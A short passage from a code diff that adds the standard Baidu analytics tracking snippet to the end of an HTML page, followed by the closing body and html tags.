+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?5cedc0509c3675ce7544f6ab75111536";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+</body>
+</html>
